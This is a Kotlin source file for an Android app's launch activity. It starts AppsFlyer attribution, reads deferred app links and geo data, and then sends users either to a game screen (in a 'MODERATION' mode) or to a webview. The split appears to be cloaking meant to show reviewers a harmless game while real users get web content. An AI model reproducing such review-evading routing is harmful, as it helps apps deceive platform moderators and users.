package com.skgames.traffi

import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.activity.viewModels
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.google.android.material.snackbar.Snackbar
import com.skgames.traffi.databinding.ActivityNevMainBinding
import com.skgames.traffi.nev.Constance
import com.skgames.traffi.nev.DataForVebViev
import dagger.hilt.android.AndroidEntryPoint
import dagger.hilt.android.scopes.ActivityScoped
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch


@AndroidEntryPoint
@ActivityScoped
class NevMainActivity : AppCompatActivity() {

    private val mainViewModel by viewModels<SortVievModell>()

    private var _binding: ActivityNevMainBinding? = null
    private val binding get() = _binding ?: throw RuntimeException("ActivityNevMainBinding = null")


    override fun onCreate(savedInstanceState: Bundle?) {

        super.onCreate(savedInstanceState)
        _binding = ActivityNevMainBinding.inflate(layoutInflater)
        setContentView(binding.root)


        lifecycleScope.launch {
            mainViewModel.iniSettingVievModel()

            mainViewModel.fetchDeferredAppLinkData(this@NevMainActivity)

            mainViewModel.initAppsFlyerLib(this@NevMainActivity)

            mainViewModel.getGeoData()
        }

        mainViewModel.currentMode.observe(this) {
            when (it) {
                SortClass.LOADING -> {
                    Log.d("lolo", "Loading")
//                    Snackbar.make(
//                        binding.root, "LOADING",
//                        Snackbar.LENGTH_SHORT
//                    ).show()
                }
                SortClass.MODERATION -> {
                    val intent = Intent(this, GaammActivity::class.java)
                    startActivity(intent)
                    finish()
                }
                SortClass.TEST_VEB -> {
                    val dataForSend = mainViewModel.sendDataForVebVeiv()
                    goToVebVievActivity(dataForSend)
                }
                SortClass.REAL_START -> {

                    mainViewModel.sendDataForVebVeiv().also {
                        goToVebVievActivity(it)
                    }
                }
                SortClass.REAL_START_NO_APPS -> {

                    mainViewModel.sendDataForVebVeiv().also {
                        goToVebVievActivity(it)
                    }
                }
            }
        }
    }

    private fun goToVebVievActivity(dataForSend: DataForVebViev) {
        val intent = Intent(this@NevMainActivity, PolicyActivity::class.java).also {
            it.putExtra(Constance.KEY_DATA_FOR_VEB_VIEV, dataForSend)
        }
        startActivity(intent)
        finish()
    }
}